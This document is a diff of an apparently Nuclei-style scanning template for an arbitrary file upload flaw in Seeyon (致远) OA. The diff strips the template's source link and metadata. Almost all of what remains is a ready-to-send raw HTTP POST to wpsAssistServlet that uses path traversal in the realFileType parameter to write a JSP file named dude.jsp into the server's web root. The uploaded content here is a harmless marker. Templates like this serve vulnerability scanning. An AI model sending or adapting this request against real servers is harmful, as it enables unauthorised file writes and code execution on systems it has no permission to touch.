@@ -3,14 +3,8 @@ info:
   name: 致远 OA 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxokomf5okpy8h6r
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gxokomf5okpy8h6r
-    fofa: 暂无
 http:
 - raw:
   - 'POST /seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/dude.jsp&fileId=1 HTTP/1.1
@@ -22,8 +16,6 @@ http:
     Content-Type: multipart/form-data; boundary=6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
 
 
-
-
     --6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
 
 
@@ -31,8 +23,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     12345
